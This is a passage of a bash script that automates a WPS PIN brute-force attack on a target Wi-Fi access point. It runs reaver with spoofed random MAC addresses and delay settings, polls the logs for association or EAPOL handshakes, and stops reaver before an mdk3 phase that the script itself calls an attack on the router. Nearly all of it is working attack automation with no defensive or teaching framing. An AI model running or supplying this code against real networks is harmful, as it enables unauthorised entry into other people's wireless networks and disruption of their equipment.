echo -e "$info Recurring-delay pin attempts x     = $yel$RX1" 
echo -e "$info Recurring-delay sleep in sec y     = $yel$RY1"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"
echo -e "$txtrst"


Eterm -g 80x10-1+100 --cmod "red" -T "Reaver4h" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -E -S -vv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

#############PIN Addittions

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"

echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver5h" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -vv -x 60  --pin=$WPS_PIN1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]]; then


echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Recurring-delay pin attempts x     = $yel$RX1" 
echo -e "$info Recurring-delay sleep in sec y     = $yel$RY1"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"

echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver6h" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -vv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

